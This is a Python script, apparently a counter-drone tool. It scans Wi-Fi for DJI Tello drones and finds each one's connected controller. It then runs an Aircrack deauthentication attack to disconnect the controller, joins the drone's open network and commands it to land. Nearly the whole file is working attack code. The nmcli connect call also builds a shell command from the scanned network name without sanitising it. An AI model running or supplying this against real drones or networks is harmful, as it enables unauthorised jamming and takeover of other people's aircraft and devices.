from djitellopy import Tello
import sys
import AircrackWrapper
import os
import time

def getEssid(scan_output):
	lineIndexes = []
	listOfESSID = []
	print(scan_output)
	list = scan_output.splitlines()
	for i in range (0, len(list)-1):
		if "TELLO" in list[i]:
			lineIndexes.append(i)
	if len(lineIndexes) < 1:
		print("No UAS found on network adapter interface")
		listOfESSID = False
	else:
		for i in range (0, len(lineIndexes)):
			details = list[lineIndexes[i]].split()
			listOfESSID.append(details[8])
	return listOfESSID

def getBssid(scan_output):
	lineIndexes = []
	listOfBSSID = []
	list = scan_output.splitlines()
	for i in range (0, len(list)-1):
		if "TELLO" in list[i]:
			lineIndexes.append(i)
	if len(lineIndexes) < 1:
		print("No UAS found on network adapter interface")
		listOfBSSID = False
	else:
		for i in range (0, len(lineIndexes)):
			details = list[lineIndexes[i]].split()
		
			#add in order - ESSID name, MAC address, Channel number
			array = [details[8], details[0], details[5]]
			listOfBSSID.append(array)

	return listOfBSSID


def getTargetBSSID(scan_output):
	list = scan_output.splitlines()
	if len(list) >3:
		if 'STATION' in list[3]:
			details = list[4].split()
			return details[1]
		else:
			details = list[3].split()
			return details[1]

	else:
		return False

if __name__ == "__main__":
	NAI = str(input("Enter the network adapter interface: "))
	mode = str(input("Enter the mode (LIVE/DETECT): "))

	aircrack = AircrackWrapper.Aircrack(NAI, simulation=False)
	if mode =="detect":
		ap_scan_output = aircrack.detect_ap(timeout=20)
		listOfDroneDetails = getEssid(ap_scan_output)
		if listOfDroneDetails == False:
			print("------------------------------------------------")
		else:
			print("Devices found: ")
			for i in range (0, len(listOfDroneDetails)):
				print(listOfDroneDetails[i])
	else:
		ap_scan_output = aircrack.detect_ap(timeout=15)
		print(ap_scan_output)
		listOfDroneDetails = getBssid(ap_scan_output)
		if listOfDroneDetails == False:
			print("--------")
		else:

			print('Drone Access Points discovered - {0}'.format(len(listOfDroneDetails)))
			print("---------------------------\n")

			for i in range (0, len(listOfDroneDetails)):
			
				print("Dealing with {0} - drone {1} of {2} \n".format(listOfDroneDetails[i][0], (i + 1), len(listOfDroneDetails)))
				user = str(input("Press T to target or I to ignore:"))
				print('\n')

				if user == "T":
					
					essid = listOfDroneDetails[i][0]
					bssid = listOfDroneDetails[i][1]
					channel = listOfDroneDetails[i][2]

					print("---------------------------")
					print('Drone ESSID - {0}'.format(essid))
					print('Drone BSSID - {0}'.format(bssid))
					print('Drone WiFi Channel - {0}'.format(channel))
					print("---------------------------\n")

					print("Searching for stationed devices (clients)...")
					op_scan_output = aircrack.detect_op(bssid, channel, timeout=80)
					print(op_scan_output)

					target = getTargetBSSID(op_scan_output)
					print("Target MAC address - {0} \n".format(target))

					#Edit getTargetBSSID to check if there is a station, loop through
					#for line that contains station, then go to next line to get Target BSSID (MAC addr)?


					if target == False or target == channel:
						print("Drone not being stationed / Stationed device not found")
						print("---------------------------\n")
					else:
						print("Deauth attack starting")
						aircrack.deauth(bssid, target, timeout=30)

						#Attempt to connect to drone access point, land the drone
						#and then disconnect 

						try:
							os.system("nmcli d wifi connect {0} password ''".format(essid))
							time.sleep(5) #wait for the connection to establish
						
							#Attempt to land / take down the drone
							drone = Tello()
							drone.connect()
							drone.land()

							#Attempt to disconnect from the drone access point
							os.system(f'nmcli d wifi disconnect {essid}')
							print('Disconnected from the drone\'s Wi-Fi network.')
						except:
							print("Failed to connect to and land drone")
				else:
					print("Target ignored")
					print("---------------------------\n")
					continue

			print("Deauthentication attack sequence ended")
else:
	print("Startup error")